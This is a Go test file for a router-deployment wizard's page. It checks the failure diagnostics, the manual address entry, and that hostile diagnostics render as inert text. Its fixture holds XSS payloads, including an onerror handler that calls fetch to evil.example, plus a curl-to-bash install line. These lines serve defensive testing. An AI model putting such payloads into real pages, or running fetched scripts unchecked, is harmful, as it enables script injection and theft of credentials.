package app

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// discovery_ui_test.go pins the two wizard behaviours the operator did not have
// when he was blocked on 2026-09-25: a failure screen that says what was tried
// and what to do, and a way to type the router's address instead of having to
// re-run the script with positional arguments.
//
// The DOM-safety rule from dom_sink_test.go applies here too: this page is
// served from the origin that holds #password (the router's root password), so
// server-supplied strings (interface names, gateway addresses, remediation
// text) must reach the DOM as TEXT, never through the HTML parser.

// TestScanRendersServerDiagnostics: the failure view must be built from the
// server's structured diagnostics, not from one fixed sentence.
func TestScanRendersServerDiagnostics(t *testing.T) {
	html := string(indexHTML)

	// A container the diagnostic block is rendered into.
	if !strings.Contains(html, `id="scan-detail"`) {
		t.Error("index.html has no #scan-detail container for the diagnostic block")
	}

	body := funcBody(t, html, "scan")
	for _, want := range []string{"data.diagnostics", "renderScanFailure"} {
		if !strings.Contains(body, want) {
			t.Errorf("scan() must render the server diagnostics (missing %q):\n%s", want, body)
		}
	}
	// A transport-level failure (the wizard itself is gone, or the JSON is not
	// JSON) must still reach the same diagnostic path rather than a bare
	// sentence — that is the state the operator was in.
	if !strings.Contains(body, "renderScanFailure(null") && !strings.Contains(body, "renderScanFailure(undefined") {
		t.Errorf("scan() must fall back to renderScanFailure on a failed fetch:\n%s", body)
	}

	// The block renders interfaces, gateways, probes and remediation.
	render := funcBody(t, html, "renderScanFailure")
	for _, want := range []string{
		"diag.interfaces", "diag.gateways", "diag.probes",
		"diag.remediation", "diag.summary",
	} {
		if !strings.Contains(render, want) {
			t.Errorf("renderScanFailure() must render %q:\n%s", want, render)
		}
	}
	// The block must show the problem flag on an interface line (that is where
	// "link up, NO IPv4" / "no link" reach the operator).
	if !strings.Contains(render, "problem") {
		t.Errorf("renderScanFailure() must render the per-interface problem flag:\n%s", render)
	}
}

// TestManualAddressEntryIsAlwaysAvailable pins deliverable 4: the operator can
// type the router address and go straight to identify+deploy.
func TestManualAddressEntryIsAlwaysAvailable(t *testing.T) {
	html := string(indexHTML)

	// A real text input plus a real button, in their own card.
	for _, want := range []string{
		`id="manual-ip"`, `id="manual-btn"`, `id="manual-view"`, `id="manual-hint"`,
		`onclick="useManualIP()"`,
	} {
		if !strings.Contains(html, want) {
			t.Errorf("index.html is missing %s — the address can then only be supplied by re-running the script", want)
		}
	}
	// The block must not start hidden by a *scan* result: scan() reveals it.
	scanBody := funcBody(t, html, "scan")
	if !strings.Contains(scanBody, "manual-view") {
		t.Errorf("scan() must reveal #manual-view (the manual address card):\n%s", scanBody)
	}

	body := funcBody(t, html, "useManualIP")
	// It POSTs the typed address to the identify endpoint …
	if !strings.Contains(body, "/api/identify") {
		t.Errorf("useManualIP() must POST /api/identify:\n%s", body)
	}
	// … and selects it, so Deploy works without discovery ever finding it.
	if !strings.Contains(body, "sel.value = ip") && !strings.Contains(body, "select.value = ip") {
		t.Errorf("useManualIP() must select the typed address:\n%s", body)
	}
	// A malformed address must be refused locally (a typo must not become a
	// silent deploy against a wrong host).
	if !strings.Contains(body, "validIPv4") {
		t.Errorf("useManualIP() must validate the address before using it:\n%s", body)
	}

	// The validator itself: shape check only, no hostname/DNS.
	valid := funcBody(t, html, "validIPv4")
	if !strings.Contains(valid, "test") {
		t.Errorf("validIPv4() must be a real check:\n%s", valid)
	}
}

// TestRouterLabelShowsClassification pins the honest labelling in the dropdown:
// the server's note is shown, so an unverified LAN host cannot read as a
// router, and identified devices come first because the server sorted them.
func TestRouterLabelShowsClassification(t *testing.T) {
	html := string(indexHTML)
	body := funcBody(t, html, "formatRouterLabel")
	if !strings.Contains(body, "r.note") {
		t.Errorf("formatRouterLabel() must show the server's classification note:\n%s", body)
	}
	if !strings.Contains(body, "r.identified") {
		t.Errorf("formatRouterLabel() must distinguish identified routers from unverified hosts:\n%s", body)
	}
}

// TestHostileDiagnosticsRenderAsInertText executes the REAL renderScanFailure()
// under the recording DOM stub from dom_sink_test.go with an attacker-shaped
// diagnostic payload and asserts every value arrives as text.
func TestHostileDiagnosticsRenderAsInertText(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not installed — skipping the executed DOM check (the source contract still runs)")
	}

	html := string(indexHTML)
	script := jsDOMStub + "\nvar scanDiag = " + hostileDiagJSON + ";\n" +
		funcBody(t, html, "renderScanFailure") + "\n" + jsScanDiagTrigger

	dir := t.TempDir()
	path := filepath.Join(dir, "scan_diag_check.js")
	if err := os.WriteFile(path, []byte(script), 0o600); err != nil {
		t.Fatalf("write harness: %v", err)
	}
	out, err := exec.Command(node, path).CombinedOutput()
	if err != nil {
		t.Fatalf("node harness failed: %v\n%s", err, out)
	}
	var dump struct {
		Text     string   `json:"text"`
		HTMLSets []string `json:"htmlSets"`
		Kids     int      `json:"elementChildren"`
		Hostile  string   `json:"hostile"`
	}
	if err := json.Unmarshal(out, &dump); err != nil {
		t.Fatalf("harness did not return JSON: %v\n%s", err, out)
	}
	if len(dump.HTMLSets) != 0 {
		t.Errorf("diagnostic values went through innerHTML %d time(s) — an interface name such as %q would be parsed as markup in the origin that holds #password:\n%s",
			len(dump.HTMLSets), dump.Hostile, strings.Join(dump.HTMLSets, "\n"))
	}
	if !strings.Contains(dump.Text, dump.Hostile) {
		t.Errorf("the diagnostic text was not rendered at all (want it to contain %q):\n%s", dump.Hostile, dump.Text)
	}
	for _, want := range []string{"192.168.2.1", "link up, NO IPv4", "install-and-test.sh", "192.168.2.48"} {
		if !strings.Contains(dump.Text, want) {
			t.Errorf("rendered block is missing %q:\n%s", want, dump.Text)
		}
	}
}

// hostileDiagJSON is the diagnostic payload an attacker on the LAN can shape:
// interface names come from the host, but the neighbouring device controls
// what identification produced, and the section headers are interpolated next
// to them.
const hostileDiagJSON = `{
  summary: '<svg onload=alert(1)> nothing answered',
  interfaces: [{ name: '<img src=x onerror=fetch("//evil.example")>', state: 'up', carrier: '1', ipv4: ['192.168.2.33/24'], problem: '<b>link up, NO IPv4</b>' }],
  gateways: ['192.168.2.1'],
  probes: [{ ip: '192.168.2.48', source: '<script>alert(2)<\/script>', detail: 'x', ssh: false, httpPort: 80, note: '<i>unverified host</i>' }],
  sources: ['default-route gateway: 1 address(es)'],
  remediation: ['<img src=y onerror=alert(3)> use the LAN port', 'then bash <(curl -fsSL https://example.test/install-and-test.sh) <ROUTER-IP> \'\' <you@wallet.app>'],
  manualHint: '192.168.2.1'
}`

// jsScanDiagTrigger drives renderScanFailure once and dumps what the DOM got.
const jsScanDiagTrigger = `
(function () {
  renderScanFailure(scanDiag);
  function textOf(el) {
    var s = el._text || '';
    for (var i = 0; i < el.children.length; i++) {
      var c = el.children[i];
      s += c.textNode ? c.textContent : textOf(c);
    }
    return s;
  }
  function walk(el, out) {
    out.htmlSets = out.htmlSets.concat(el._innerHTMLSets || []);
    for (var i = 0; i < el.children.length; i++) {
      if (!el.children[i].textNode) walk(el.children[i], out);
    }
    return out;
  }
  var box = byId['scan-detail'];
  var out = walk(box, { htmlSets: [] });
  process.stdout.write(JSON.stringify({
    text: textOf(box),
    htmlSets: out.htmlSets,
    elementChildren: box.children.filter(function (c) { return !c.textNode; }).length,
    hostile: '<img src=x onerror=fetch("//evil.example")>'
  }));
})();
`
